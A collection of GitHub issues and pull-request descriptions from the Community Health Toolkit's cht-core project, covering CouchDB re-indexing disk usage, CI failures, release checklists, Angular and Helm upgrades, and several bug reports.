title: Investigate Couch disk usage during view re-indexing
body:
**Describe the issue**
To support https://github.com/medic/cht-core/issues/2849 and/or https://github.com/medic/cht-core/issues/9982, we need to have a clear understanding of Couch's disk usage during the view re-indexing process.  The ultimate goal is to minimize the _ceiling value_ of disk space needed to re-index views during a Couch upgrade.  

So far I have conducted the following basic test:

## Measure disk usage during basic Couch view re-indexing

Steps:

1. Create Couch database with one design document (`_design/medic-client`) containing two (very large) views:  
    - [contacts_by_freetext](https://github.com/medic/cht-core/blob/master/ddocs/medic-db/medic-client/views/contacts_by_freetext/map.js)
    - [reports_by_freetext](https://github.com/medic/cht-core/blob/master/ddocs/medic-db/medic-client/views/reports_by_freetext/map.js)
2. Populate database with ~500,000 randomized documents
3. Ensure views are warmed
4. Manually run compaction on database and views
5. Perform $VIEW_OPERATION while polling for size data both for `_design/medic-client` and a generic `du` of the directory containing the Couch data.
6. Re-run compaction of db/views

See the [raw datasets](https://docs.google.com/spreadsheets/d/14qOWQgv7Tqzxk1WAMAdUEBX3UUHm07OfRNfL1pP2P4g/edit?usp=sharing) for more details.

### Add view

Added a new simple view to the `_design/medic-client` design doc.

|| Directory Size |
| ------- | ------- |
| Start | 993   |
| Max  | 7540 |
| End   | 1480 |

![Image](https://github.com/user-attachments/assets/1aa27e56-3a01-4f47-ada1-1234b9908015)

### Remove view

Removed the `contacts_by_freetext` view.

||Directory Size |
| ------- | ------- |
| Start | 987   |
| Max  | 7319 |
| End   | 972 |

![Image](https://github.com/user-attachments/assets/f62e9853-6f41-460e-98d6-cf0eb15ba75e)

### Update view

Update the `contacts_by_freetext` view (in a way that does not actually affect what is emitted).


|| Directory Size |
| ------- | ------- |
| Start | 987   |
| Max  | 7504 |
| End   | 1479 |

![Image](https://github.com/user-attachments/assets/70ed77ef-6a0d-4e99-9bc9-3ee63a9a123e)


### COUNTER-EXAMPLE Add view in separate design doc

If I add a new view to the same database, but in its own design doc (and not `_design/medic-client`) it has a much more limited effect. (And note that the real spike in disk usage comes from the expected 2x usage during compaction.)


|| Directory Size |
| ------- | ------- |
| Start | 972   |
| Max  | 1802 |
| End   | 974 |

![Image](https://github.com/user-attachments/assets/7fde8a17-4a1b-4e10-b685-ed3ac21b3b91)

title: enketo-core@7.2.5 compatibility with node and npm
body:
**Describe the issue**
As we migrate to release 4.15.x, we have encountered an issue in our CI pipeline when installing dependencies using the webapp package-lock.json file.

As we have engine-strict set to true (.npmrc file in root) we enforce adherence to node.js and npm version restrictions as per any engine configuration for the associated package. In this case, we are encountering the following npm ci install error on enkete-core@7.2.5:

> npm error engine Not compatible with your version of node/npm: enketo-core@7.2.5
> npm error notsup Required: {"node":">=14 <17","npm":">=6 <7"}
> npm error notsup Actual:   {"npm":"10.9.2","node":"v22.15.1"}

We would prefer to not relax our implementation of engine-strict, as we would like to ensure package stability as far as possible.  After further investigation we established that node and npm restrictions were implemented as part of the uplifting of enketo-core to version 7 https://github.com/medic/cht-core/issues/7599 which subsequently includes a bump to node 20 as part of #https://github.com/medic/cht-core/issues/7993

The bump to node 20 effectively breaks the enketo-core package node and npm restrictions.

**Describe the improvement you'd like**
Before deciding on any solution on our side, we would like to follow up with you to see what our options are and if the unsupported nature of enketo-core@7.2.5 on node 20 is a potential issue or showstopper? I do see there is a dedicated issue to the upgrade of enketo-core to version 8 or possibly 9 #https://github.com/medic/cht-core/issues/8755 and would like to establish if there are any plans to upgrade enketo-core in the near future to ensure compliance and compatibility with node?

title: Remove haproxy-healthcheck service from single-node CouchDb deployments
body:
**Describe the issue**
[Haproxy-healthcheck](https://github.com/medic/cht-core/tree/master/haproxy-healthcheck) is a service that will periodically query CouchDb servers and insure that all servers in a cluster are up.
This service is only required when CouchDb is clustered and not for CouchDb single node, but it is deployed even for single node. It requires its own container and is relatively low resource consuming. 

**Describe the improvement you'd like**
Remove haproxy-healthcheck from single-node deployments, and have haproxy use the `_up` endpoint directly. 

**Describe alternatives you've considered**
Leave it as it is.

title: Release 4.20.0
body:
# Planning - CHT Community 

- [x] Create a GH Milestone for the release. We use [semver](http://semver.org) so if there are breaking changes increment the major, otherwise if there are new features increment the minor, otherwise increment the service pack. Breaking changes in our case relate to updated software requirements (egs: CouchDB, node, minimum browser versions), broken backwards compatibility in an api, or a major visual update that requires user retraining.
- [x] Add all the issues to be worked on to the Milestone. Ideally each minor release will have one or two features, a handful of improvements, and plenty of bug fixes.
- [x] Identify any features and improvements in the release that need end-user documentation (beyond eng team documentation improvements) and create corresponding issues in the cht-docs repo.
- [x] Assign an engineer as Release Engineer for this release.

# Development - Release Engineer

When development is ready to begin one of the engineers should be nominated as a Release Engineer. They will be responsible for making sure the following tasks are completed though not necessarily completing them.

- [x] Checkout to a new `<issue>-update-version` branch (eg: `1234-update-version`) and set the version number in the `package.json` and `package-lock.json`. The easiest way to do this is to use `npm --no-git-tag-version version <major|minor>`. Once the version is updated, submit a PR to `master` branch.
- [ ] Ensure that issues associated with commits merged to `master` since the last release are closed and mapped to the milestone.

# Releasing - Release Engineer

Once the PR has been merged into `master`, and the `master` branch has the new version number, then the release process can start:

- [x] Create a new release branch from `master` named `<major>.<minor>.x` in `cht-core`. Post a message to #development Slack channel using this template:
```
@channel I've just created the `<major>.<minor>.x` release branch. Please be aware that any further changes intended for this release will have to be merged to `master` then backported. Thanks!
```
- [x] Build a beta named `<major>.<minor>.<patch>-beta.1` by creating a lightweight git tag (e.g. `git tag <major>.<minor>.<patch>-beta.1`) and then push the created tag.
- [x] Once the CI completes successfully notify the team by writing a message in the #development Slack channel:
```
@channel, I’ve just created the `<major>.<minor>.<patch>-beta.1` tag. 
Please let me know if there’s any final update we need to make. 
If all is good, then in 24h, I will start the release. Thanks!
```
- [ ] The beta tag will automatically trigger the scalability build. Once it passes, download the scalability results on S3 at medic-e2e/scalability/$TAG_NAME. If you do not have access to the scalability results ask someone in the #product-team who has access. Add the release `.json` file to `cht-core/tests/scalability/previous_results`. More info in the  [scalability documentation](https://github.com/medic/cht-core/blob/master/tests/scalability/README.md).
- [x] Go to the [Issues tab](https://github.com/medic/cht-core/issues) and filter the issues with `is:issue label:"Affects: 4.x.x" ` , replace `4.x.x` with the previous version number. Add any open "known issues" from the prior release that were not fixed in this release. Done by adding the correct `Affects: 4.x.x` label.  
- [x] Add release notes to the [Core Framework Releases](https://docs.communityhealthtoolkit.org/core/releases/) page:
  - [x] Create a new document for the release in the [releases folder](https://github.com/medic/cht-docs/tree/main/content/en/core/releases).
  - [x] Ensure all issues are in the GH Milestone, they have human readable descriptions, and that they're correctly labelled. In particular: they have one "Type" label, "UI/UX" if they change the UI, and "Breaking change" if appropriate.
  - [x] Use [this script](https://github.com/medic/cht-core/blob/master/scripts/release-notes/index.js) to export the issues into our release note format.
  - [x] Collect known migration steps, descriptions, screenshots, videos, data, and anything else to help communicate particularly important changes. This information should already be on the issue, but if not, prompt the change author to provide it.
  - [x] Document any required or recommended upgrades to our other products (eg: cht-conf, cht-gateway, cht-android).
  - [x] Add the release to the [Supported versions](https://docs.communityhealthtoolkit.org/core/releases/#supported-versions) and update the EOL date of the previous release. Update the status of any releases that are past their End Of Life date. Also add a link in the `Release Notes` section to the new release page.
- [x] Create a [new release](https://github.com/medic/cht-core/releases/new) in GitHub, with the naming convention `<major>.<minor>.<patch>`, from the release branch created above as the target branch. Click on the "Choose a tag" dropdown and create a tag for the release with the naming convention `<major>.<minor>.<patch>`. Ensure the release notes PR from above are merged. Add a link to the release notes in the description of the release.
- [x] Once you publish the release, confirm the release build completes successfully and the new release is available on the [market](https://staging.dev.medicmobile.org/_couch/builds_4/_design/builds/_view/releases). Make sure that the document has new entry with `id: medic:medic:<major>.<minor>.<patch>`
- [x] Upgrade the [demo](https://demo-cht.dev.medicmobile.org/) instance to the newly released version.
- [x] Use cht-conf to upload the configuration from the `cht-core/config/demo` folder to the `demo-cht.dev` server.
- [x] Announce the release on the [CHT forum](https://forum.communityhealthtoolkit.org/c/product/releases/26), under the "Product - Releases" category using this template:

title: ci-integration e2e test fails due to a race condition where not all containers are up
body:
**Describe the issue**
Failure can be seen here: https://github.com/medic/cht-core/actions/runs/15342925574/job/43175905288?pr=9996#step:18:1470

The issue is that a previous test ([should work after restarting CouchDb @docker](https://github.com/medic/cht-core/blob/41305f365bcd49afa0fa9b185c9cb898509fba30/tests/integration/api/server.spec.js#L224)) intentionally crashes some containers to assess that they come up after the crash. However the test does not wait for containers to stabilize, so the next test in the sequence tries to connect to a server that is not yet up. 

**Describe the improvement you'd like**
Make sure the restarting test is working correctly and that it doesn't end before containers are stable.

title: Release 5.0.0
body:
# Planning - CHT Community 

- [x] Create a GH Milestone for the release. We use [semver](http://semver.org) so if there are breaking changes increment the major, otherwise if there are new features increment the minor, otherwise increment the service pack. Breaking changes in our case relate to updated software requirements (egs: CouchDB, node, minimum browser versions), broken backwards compatibility in an api, or a major visual update that requires user retraining.
- [x] Add all the issues to be worked on to the Milestone. Ideally each minor release will have one or two features, a handful of improvements, and plenty of bug fixes.
- [x] Identify any features and improvements in the release that need end-user documentation (beyond eng team documentation improvements) and create corresponding issues in the cht-docs repo.
- [x] Assign an engineer as Release Engineer for this release.

# Development - Release Engineer

When development is ready to begin one of the engineers should be nominated as a Release Engineer. They will be responsible for making sure the following tasks are completed though not necessarily completing them.

- [x] Checkout to a new `<issue>-update-version` branch (eg: `1234-update-version`) and set the version number in the `package.json` and `package-lock.json`. The easiest way to do this is to use `npm --no-git-tag-version version <major|minor>`. Once the version is updated, submit a PR to `master` branch.
- [x] Ensure that issues associated with commits merged to `master` since the last release are closed and mapped to the milestone.

# Releasing - Release Engineer

Once the PR has been merged into `master`, and the `master` branch has the new version number, then the release process can start:

- [x] Create a new release branch from `master` named `<major>.<minor>.x` in `cht-core`. Post a message to #development Slack channel using this template:
```
@channel I've just created the `<major>.<minor>.x` release branch. Please be aware that any further changes intended for this release will have to be merged to `master` then backported. Thanks!
```
- [x] Build a beta named `<major>.<minor>.<patch>-beta.1` by creating a lightweight git tag (e.g. `git tag <major>.<minor>.<patch>-beta.1`) and then push the created tag.
- [x] Once the CI completes successfully notify the team by writing a message in the #development Slack channel:
```
@channel, I’ve just created the `<major>.<minor>.<patch>-beta.1` tag. 
Please let me know if there’s any final update we need to make. 
If all is good, then in 24h, I will start the release. Thanks!
```
- [x] The beta tag will automatically trigger the scalability build. Once it passes, download the scalability results on S3 at medic-e2e/scalability/$TAG_NAME. If you do not have access to the scalability results ask someone in the #product-team who has access. Add the release `.json` file to `cht-core/tests/scalability/previous_results`. More info in the  [scalability documentation](https://github.com/medic/cht-core/blob/master/tests/scalability/README.md).
- [x] Go to the [Issues tab](https://github.com/medic/cht-core/issues) and filter the issues with `is:issue label:"Affects: 4.x.x" ` , replace `4.x.x` with the previous version number. Add any open "known issues" from the prior release that were not fixed in this release. Done by adding the correct `Affects: 4.x.x` label.  
- [x] Add release notes to the [Core Framework Releases](https://docs.communityhealthtoolkit.org/core/releases/) page:
  - [x] Create a new document for the release in the [releases folder](https://github.com/medic/cht-docs/tree/main/content/en/core/releases).
  - [x] Ensure all issues are in the GH Milestone, they have human readable descriptions, and that they're correctly labelled. In particular: they have one "Type" label, "UI/UX" if they change the UI, and "Breaking change" if appropriate.
  - [x] Use [this script](https://github.com/medic/cht-core/blob/master/scripts/release-notes/index.js) to export the issues into our release note format.
  - [x] Collect known migration steps, descriptions, screenshots, videos, data, and anything else to help communicate particularly important changes. This information should already be on the issue, but if not, prompt the change author to provide it.
  - [x] Document any required or recommended upgrades to our other products (eg: cht-conf, cht-gateway, cht-android).
  - [x] Add the release to the [Supported versions](https://docs.communityhealthtoolkit.org/core/releases/#supported-versions) and update the EOL date of the previous release. Update the status of any releases that are past their End Of Life date. Also add a link in the `Release Notes` section to the new release page.
- [x] Create a [new release](https://github.com/medic/cht-core/releases/new) in GitHub, with the naming convention `<major>.<minor>.<patch>`, from the release branch created above as the target branch. Click on the "Choose a tag" dropdown and create a tag for the release with the naming convention `<major>.<minor>.<patch>`. Ensure the release notes PR from above are merged. Add a link to the release notes in the description of the release.
- [x] Once you publish the release, confirm the release build completes successfully and the new release is available on the [market](https://staging.dev.medicmobile.org/_couch/builds_4/_design/builds/_view/releases). Make sure that the document has new entry with `id: medic:medic:<major>.<minor>.<patch>`
- [x] Upgrade the [demo](https://demo-cht.dev.medicmobile.org/) instance to the newly released version.
- [ ] Use cht-conf to upload the configuration from the `cht-core/config/demo` folder to the `demo-cht.dev` server.
- [x] Announce the release on the [CHT forum](https://forum.communityhealthtoolkit.org/c/product/releases/26), under the "Product - Releases" category using this template:
```
*We're excited to announce the release of {{version}} of {{product}}*

See below for some highlights, read the [release notes]({{<paste-url>}}) for full details.

Following the CHT's support policy, versions {{versions}} are no longer supported. Projects running these versions should start planning to upgrade in the near future. For more details read the CHT [software support documentation](https://docs.communityhealthtoolkit.org/core/releases/#supported-versions).

## {{version}} Highlights

### [{{Highlight 1}}]({{<paste-url to section>}})

{{description of highlight section}}

### ### [{{Highlight 2}}]({{<paste-url to section>}})

{{description of highlight section}}

### [And more...]({{paste-url to section}})

We’ve also implemented loads of other improvements and fixed a heap of bugs.

```
- [x] Go over the list of commits and individually notify contributing / interested community members about the release. 
- [x] Add one last update to the #development Slack channel and use the thread to lead an internal release retrospective covering what went well and areas to improve for next time.
- [x] Mark this issue "done" and close the Milestone.

This PR continues the work from #9897

title: CI fails fails due to Docker Compose error followed by undici fetch errors
body:
**Describe the issue**
The CI pipeline is failing due to a Docker Compose error, which prevents services from starting. As a result, all E2E tests fail with undici fetch errors.

1. During the startup Docker Compose fails with this Go runtime error:
`fatal error: concurrent map writes`

Stack Trace (excerpt):
```
fatal error: concurrent map writes

goroutine 326 [running]:
runtime.throw({0x561fc2c848b6?, 0x1})
runtime.mapassign_faststr()
github.com/docker/compose/v2/pkg/compose.(*composeService).pullRequiredImages.func1.1()
...
```
I believe this is a race condition bug in Docker Compose, not a problem in our project.

2. Since services never start, all tests fail with fetch errors like:

```
TypeError: fetch failed
    at node:internal/deps/undici/undici:13392:13
    at async request (/home/runner/work/cht-core/cht-core/tests/utils/index.js:221:20)
```


 **Possible Solutions**
Add retry logic around docker compose up or pull.
Ensure services are pulled and started reliably before E2E tests begin.

Example of failed runs:
https://github.com/medic/cht-core/actions/runs/15403625577/job/43342468993
https://github.com/medic/cht-core/actions/runs/15330930633/job/43162468920

title: Implement version-specific Helm charts
body:
**Describe the issue**
We propose having the Helm chart definitions in the cht-core repository and maintaining version-specific charts aligned with each CHT release. This will help solve versioning inconsistencies, improve maintainability, and simplify deployments across different infrastructure setups.

This work stems from [community input and feedback](https://forum.communityhealthtoolkit.org/t/seeking-input-on-helm-chart-structure-and-deployment-architecture-for-cht/5032).

**Describe the improvement you'd like**
We’d like to:
- Host the Helm chart templates directly in the cht-core repository.
- Release version-specific Helm charts alongside each CHT release, ideally as downloadable assets attached to the GitHub release (similar to how Docker Compose files are published).
- Make cloud provider-specific configurations (e.g., AWS) modular or optional.
- Include the Helm charts in the testing CI workflow.
- Document a clear migration path away from the current medic/helm-charts/cht-core-4x repo while leaving existing charts intact for backward compatibility.

**Describe alternatives you've considered**
- Continue maintaining the cht-core-4x chart in the separate medic/helm-charts repository:
This would not fix the versioning challenges and make it difficult to test, release, and maintain deployments reliably.

- Refactor the existing chart in medic/helm-charts/cht-core-4x to be backward-compatible with future versions:
This would require significant effort and complexity.

title: Update `release-notes` script to include all commit co-authors in contributors list
body:
**Describe the issue**
Our script for automatically generating release notes generates a [list of "Contributors"](https://github.com/medic/cht-core/blob/80d075e0c3b46866a76ac63262a6bdd3abb34ddd/scripts/release-notes/index.js#L316) with the GitHub user details of each user listed as the author of one of the commits to `master`.  

However, many commits to `master` are the result of a lot of collaborative involving many commits to a base branch that is then squash-merged to `master` (see [this commit](https://github.com/medic/cht-core/commit/2cbe9c10991de77e5ed7408432474800ea5185d4) as an example).  For commits like this we want to include all of the "Co-authors" in the list of "Contributors" (and not just the actual "Author" of the commit, which was probably just whoever happened to merge the branch.)

### Background

As a part of the cht-core [release process](https://github.com/medic/cht-core/blob/master/.github/ISSUE_TEMPLATE/z_release_patch.md#releasing---release-engineer) we use the release notes generation script to automatically generate the base release notes content to be [included on our Docs site](https://docs.communityhealthtoolkit.org/releases/).  

**Describe the improvement you'd like**

We need to check the GitHub [graphql API](https://docs.github.com/en/graphql) and see if we can get access to the co-author data for these commits to `master`.  If so, then it should just be a matter of updating the processing in the script's `formatCommits` function to also include the co-authors in the list.

**Describe alternatives you've considered**
We could require the release manager to add this co-author information manually, but ain't nobody got time for that.

title: Release 4.21.0
body:
# Planning - CHT Community 

- [x] Create a GH Milestone for the release. We use [semver](http://semver.org) so if there are breaking changes increment the major, otherwise if there are new features increment the minor, otherwise increment the service pack. Breaking changes in our case relate to updated software requirements (egs: CouchDB, node, minimum browser versions), broken backwards compatibility in an api, or a major visual update that requires user retraining.
- [x] Add all the issues to be worked on to the Milestone. Ideally each minor release will have one or two features, a handful of improvements, and plenty of bug fixes.
- [x] Identify any features and improvements in the release that need end-user documentation (beyond eng team documentation improvements) and create corresponding issues in the cht-docs repo.
- [x] Assign an engineer as Release Engineer for this release.

# Development - Release Engineer

When development is ready to begin one of the engineers should be nominated as a Release Engineer. They will be responsible for making sure the following tasks are completed though not necessarily completing them.

- [x] Checkout to a new `<issue>-update-version` branch (eg: `1234-update-version`) and set the version number in the `package.json` and `package-lock.json`. The easiest way to do this is to use `npm --no-git-tag-version version <major|minor>`. Once the version is updated, submit a PR to `master` branch.
- [x] Ensure that issues associated with commits merged to `master` since the last release are closed and mapped to the milestone.

# Releasing - Release Engineer

Once the PR has been merged into `master`, and the `master` branch has the new version number, then the release process can start:

- [x] Create a new release branch from `master` named `<major>.<minor>.x` in `cht-core`. Post a message to #development Slack channel using this template:
```
@channel I've just created the `<major>.<minor>.x` release branch. Please be aware that any further changes intended for this release will have to be merged to `master` then backported. Thanks!
```
- [x] Build a beta named `<major>.<minor>.<patch>-beta.1` by creating a lightweight git tag (e.g. `git tag <major>.<minor>.<patch>-beta.1`) and then push the created tag.
- [x] Once the CI completes successfully notify the team by writing a message in the #development Slack channel:
```
@channel, I’ve just created the `<major>.<minor>.<patch>-beta.1` tag. 
Please let me know if there’s any final update we need to make. 
If all is good, then in 24h, I will start the release. Thanks!
```
- [x] The beta tag will automatically trigger the scalability build. Once it passes, download the scalability results on S3 at medic-e2e/scalability/$TAG_NAME. If you do not have access to the scalability results ask someone in the #product-team who has access. Add the release `.json` file to `cht-core/tests/scalability/previous_results`. More info in the  [scalability documentation](https://github.com/medic/cht-core/blob/master/tests/scalability/README.md).
- [x] Go to the [Issues tab](https://github.com/medic/cht-core/issues) and filter the issues with `is:issue label:"Affects: 4.x.x" ` , replace `4.x.x` with the previous version number. Add any open "known issues" from the prior release that were not fixed in this release. Done by adding the correct `Affects: 4.x.x` label.  
- [x] Add release notes to the [Core Framework Releases](https://docs.communityhealthtoolkit.org/core/releases/) page:
  - [x] Create a new document for the release in the [releases folder](https://github.com/medic/cht-docs/tree/main/content/en/core/releases).
  - [x] Ensure all issues are in the GH Milestone, they have human readable descriptions, and that they're correctly labelled. In particular: they have one "Type" label, "UI/UX" if they change the UI, and "Breaking change" if appropriate.
  - [x] Use [this script](https://github.com/medic/cht-core/blob/master/scripts/release-notes/index.js) to export the issues into our release note format. _**Extra:** Be sure all contributors are accounted for if [this script](https://github.com/medic/cht-core/issues/10023)  isn't updated yet!_
  - [x] Collect known migration steps, descriptions, screenshots, videos, data, and anything else to help communicate particularly important changes. This information should already be on the issue, but if not, prompt the change author to provide it.
  - [x] Document any required or recommended upgrades to our other products (eg: cht-conf, cht-gateway, cht-android).
  - [x] Add the release to the [Supported versions](https://docs.communityhealthtoolkit.org/core/releases/#supported-versions) and update the EOL date of the previous release. Update the status of any releases that are past their End Of Life date. Also add a link in the `Release Notes` section to the new release page.
- [x] Create a [new release](https://github.com/medic/cht-core/releases/new) in GitHub, with the naming convention `<major>.<minor>.<patch>`, from the release branch created above as the target branch. Click on the "Choose a tag" dropdown and create a tag for the release with the naming convention `<major>.<minor>.<patch>`. Ensure the release notes PR from above are merged. Add a link to the release notes in the description of the release.
- [x] Once you publish the release, confirm the release build completes successfully and the new release is available on the [market](https://staging.dev.medicmobile.org/_couch/builds_4/_design/builds/_view/releases). Make sure that the document has new entry with `id: medic:medic:<major>.<minor>.<patch>`
- [x] Upgrade the [demo](https://demo-cht.dev.medicmobile.org/) instance to the newly released version.
- [x] Use cht-conf to upload the configuration from the `cht-core/config/demo` folder to the `demo-cht.dev` server.
- [x] Announce the release on the [CHT forum](https://forum.communityhealthtoolkit.org/c/product/releases/26), under the "Product - Releases" category using this template:
```
*We're excited to announce the release of {{version}} of {{product}}*

See below for some highlights, read the [release notes]({{<paste-url>}}) for full details.

Following the CHT's support policy, versions {{versions}} are no longer supported. Projects running these versions should start planning to upgrade in the near future. For more details read the CHT [software support documentation](https://docs.communityhealthtoolkit.org/core/releases/#supported-versions).

## {{version}} Highlights

### [{{Highlight 1}}]({{<paste-url to section>}})

{{description of highlight section}}

### ### [{{Highlight 2}}]({{<paste-url to section>}})

{{description of highlight section}}

### [And more...]({{paste-url to section}})

We’ve also implemented loads of other improvements and fixed a heap of bugs.

```
- [x] Go over the list of commits and individually notify contributing / interested community members about the release. 
- [x] Add one last update to the #development Slack channel and use the thread to lead an internal release retrospective covering what went well and areas to improve for next time.
- [x] Mark this issue "done" and close the Milestone.

title: Upgrade to Angular 20
body:
**Describe the issue**
Angular 20 has been released: https://github.com/angular/angular/blob/21fc93bf4b2183114d7703dbea4e57c30b54c66e/CHANGELOG.md

[Migration guide steps](https://angular.dev/update-guide?v=19.0-20.0&l=3): 
Update to the new version

- [ ] Run ng update @angular/material@20.
- [ ] Rename the afterRender lifecycle hook to afterEveryRender
- [ ] Replace uses of TestBed.flushEffects() with TestBed.tick(), the closest equivalent to synchronously flush effects.
- [ ] Rename provideExperimentalCheckNoChangesForDebug to provideCheckNoChangesConfig. Note its behavior now applies to all checkNoChanges runs. The useNgZoneOnStable option is no longer available.
- [ ] Refactor application and test code to avoid relying on ng-reflect-* attributes. If needed temporarily for migration, use provideNgReflectAttributes() from @angular/core in bootstrap providers to re-enable them in dev mode only.
- [ ] Adjust code that directly calls functions returning RedirectFn. These functions can now also return an Observable or Promise; ensure your logic correctly handles these asynchronous return types.
- [ ] Rename the request property passed in resources to params.
- [ ] Rename the loader property passed in rxResources to stream.
- [ ] ResourceStatus is no longer an enum. Use the corresponding constant string values instead.
- [ ] Rename provideExperimentalZonelessChangeDetection to provideZonelessChangeDetection.
- [ ] If your templates use {{ in }} or in in expressions to refer to a component property named 'in', change it to {{ this.in }} or this.in as 'in' now refers to the JavaScript 'in' operator. If you're using in as a template reference, you'd have to rename the reference.
- [ ] The type for the commands arrays passed to Router methods (createUrlTree, navigate, createUrlTreeFromSnapshot) have been updated to use readonly T[] since the array is not mutated. Code which extracts these types (e.g. with typeof) may need to be adjusted if it expects mutable arrays.
- [ ] Review and update tests asserting on DOM elements involved in animations. Animations are now guaranteed to be flushed with change detection or ApplicationRef.tick, potentially altering previous test outcomes.
- [ ] In tests, uncaught errors in event listeners are now rethrown by default. Previously, these were only logged to the console by default. Catch them if intentional for the test case, or use rethrowApplicationErrors: false in configureTestingModule as a last resort.
- [ ] The any type is removed from the Route guard arrays (canActivate, canDeactivate, etc); ensure guards are functions, ProviderToken<T>, or (deprecated) strings. Refactor string guards to ProviderToken<T> or functions.
- [ ] Ensure your Node.js version is at least 20.11.1 and not v18 or v22.0-v22.10 before upgrading to Angular v20. Check https://angular.dev/reference/versions for the full list of supported Node.js versions.
- [ ] Replace all occurrences of the deprecated TestBed.get() method with TestBed.inject() in your Angular tests for dependency injection.
- [ ] Remove InjectFlags enum and its usage from inject, Injector.get, EnvironmentInjector.get, and TestBed.inject calls. Use options like {optional: true} for inject or handle null for *.get methods.
- [ ] Update injector.get() calls to use a specific ProviderToken<T> instead of relying on the removed any overload. If using string tokens (deprecated since v4), migrate them to ProviderToken<T>.
- [ ] Upgrade your project's TypeScript version to at least 5.8 before upgrading to Angular v20 to ensure compatibility.
- [ ] Unhandled errors in subscriptions/promises of AsyncPipe are now directly reported to ErrorHandler. This may alter test outcomes; ensure tests correctly handle these reported errors.
- [ ] If relying on the return value of PendingTasks.run, refactor to use PendingTasks.add. Handle promise results/rejections manually, especially for SSR to prevent node process shutdown on unhandled rejections.
- [ ] If your templates use {{ void }} or void in expressions to refer to a component property named 'void', change it to {{ this.void }} or this.void as 'void' now refers to the JavaScript void operator.
- [ ] Review DatePipe usages. Using the Y (week-numbering year) formatter without also including w (week number) is now detected as suspicious. Use y (year) if that was the intent, or include w alongside Y.

**Describe the improvement you'd like**
Make sure that the test assertions run _after_ the auditing has occurred.

title: Task action status
body:
**What feature do you want to improve?**
Indicate task action status (form completion) to CHWs at a glance.
If an action has already been completed, the relevant button in the group action list can either be hidden or visually differentiated to reflect its completed state.

**Describe the improvement you'd like**
This enhancement aims to improve data quality, similar to how deduplication functionality supports clean data.

Consider a task that requires a CHW to perform multiple actions, such as:
- Managing contact details for a place or person
- Capturing available facilities or medical information
- Answering research-related questions

Collecting all this information can be extensive, and it’s often unrealistic to expect a CHW to complete everything in one session. If they need to pause and return to the task later (sometimes days later). They shouldn’t have to remember exactly where they left off.

Currently, CHWs must exit the task workflow and navigate to the specific contact’s People view to verify which actions have been completed. This breaks the workflow and creates a poor user experience.

Adding a lightweight status indicator directly in the group action list would:
- Show progress at a glance
- Help prevent duplicate form submissions
- Support data quality improvements
- Do all this without adding cognitive or operational burden to the CHWs

**Describe alternatives you've considered**
Using the actions as is. Although, that does require our CHWs to navigate to the specific contact in the `People` tab to identify the work that has already been completed.

**Additional context**
https://github.com/medic/cht-core/pull/9975

title: Rendering issue in edit user modal for SSO user
body:
**Describe the bug**
As [described in this forum thread](https://forum.communityhealthtoolkit.org/t/unable-to-edit-place-for-sso-enabled-user-on-cht-v4-20-0/5077) there is an issue with rendering the edit user modal in the admin app that can occur (not all the time, but I am able to reproduce).

![Image](https://github.com/user-attachments/assets/f30c3f54-8ae4-438b-af54-d62309b8b1f2)

**To Reproduce**

Steps to reproduce the behavior:
1. Enable [SSO login](https://docs.communityhealthtoolkit.org/hosting/sso/)
2. In the admin app, add an "SSO Email Address" value to a user
3. Save the user and reopen the edit user modal for that user
4. Repeat the action of closing the modal and reopening it as necessary until you observe the behavior in the screenshot

**Expected behavior**
The edit user modal should always render properly (even for SSO users) with the "Place:" selector initialized and usable.

**Additional context**
When testing this locally, I was able to work around the issue by just re-opening the modal. 

I suspect there is a race condition caused by [this new logic](https://github.com/medic/cht-core/blob/3912847eff9c8b5e7f51cad74e0e43a307067915/admin/src/js/controllers/edit-user.js#L109) for loading the user's `oidc_login` value. I am not sure exactly how this produces the observed behavior, but is pretty much the only thing that has changed here (and I cannot seem to re-produce the behavior with a non-SSO user).  My current theory is that there was a latent race condition in how the edit user modal is loading and initializing the select2 widgets for place/contact that never manifested itself because the Promise I linked to always resolved fast enough. But, now that we have to make an extra REST call for an SSO user, the promise does not complete fast enough.

title: CHT SMS message sent via Africa's Talking stuck in "pending" state
body:
<!--
**Important**: This is a public repository. Anyone in the world can see what's posted here. If you are posting screenshots or log files, please **carefully examine them for** the presence of any kind of **protected health information** (PHI). Images or logs containing PHI _must_ be posted in fully-redacted form, with no visible PHI.
-->

**Describe the bug**
Integration with Africa's Talking has an issue where it tries to parse an already parsed response. 

**To Reproduce**
Steps to reproduce the behavior:
1. Setup Africa's talking
2. Send an SMS through the app
3. Check that the message is stuck in pending state 
4. See logged error in API. 

**Expected behavior**
Should work. 

**Logs**
```
2025-06-20T07:04:29.649 ERROR: Unable to JSON parse response: {
  SMSMessageData: {
    Message: 'Sent to 1/1 Total Cost: KES 0.8000',
    Recipients: [
      {
        cost: 'KES 0.8000',
        messageId: 'ATXid_081365ccc485678b5c0413e1795ab53e',
        messageParts: 1,
        number: '+254701******',
        status: 'Success',
        statusCode: 100
      },
      [length]: 1
    ]
  }
} 
```


**Environment**
- App: api
- Version: 4.17+

**Additional context**
Reported on the forum: https://forum.communityhealthtoolkit.org/t/cht-sms-message-sent-via-africas-talking-stuck-in-pending-state/5082/1

title: Refactor existing `getWIthLineage` functions to use `shared-libs/lineage`
Reduce disk space during upgrades (Hosting TCO)
body:
**What feature do you want to improve?**
A huge amount of disk space is needed to upgrade. This can be up to 5x of free space needed. For example, if a large deployment had 1.8 TB of data and was on a 4TB disk they would have 55% of free disk space - plenty of room to grow for months, or possibly years! However, they would need to get to upgrade to a 9TB disk to have enough free space to upgrade. This is a massive imposition and has largely been attributed to the mandatory and concurrent rebuilding of index.

**Describe the improvement you'd like**
Reduce extra disk space needed to upgrade.  Ideally this would be well under the current 5x - maybe 2x?  Another improvement would be to make an exact amount.  For example, if we were only able to reduce it 3.8x free space needed, but it was always exactly 3.8x, this would be a huge win!

**Describe alternatives you've considered**
Continue as is with 5x space needed for upgrades

**Additional context**
National deployments have been told they need 5.x the disk space and have come back to Medic to say, "We're not upgrading anytime soon. We're on bare metal and the effort to get more disk is non-trivial".  As well, when doing a lot of the [testing for Nouveau](https://github.com/medic/cht-core/issues/9542), the extra disk space needed during upgrade was front and center and a huge pain to deal with.

title: Fix: Include co-authors in release notes
body:
<!--
Please use semantic PR titles that respect this format:

<type>(#<issue number>): <subject>
-->

# Description

This PR updates the `release-notes` script to correctly include **co-authors** in the list of contributors.

Previously, only the primary author of a commit (typically the person who merged the PR) was listed. This caused contributors to be underrepresented, especially when using squash merges where many co-authors are included via `Co-authored-by:` trailers.

With this update, the script:
- Uses the GitHub GraphQL API to fetch all commit `authors` for each relevant commit
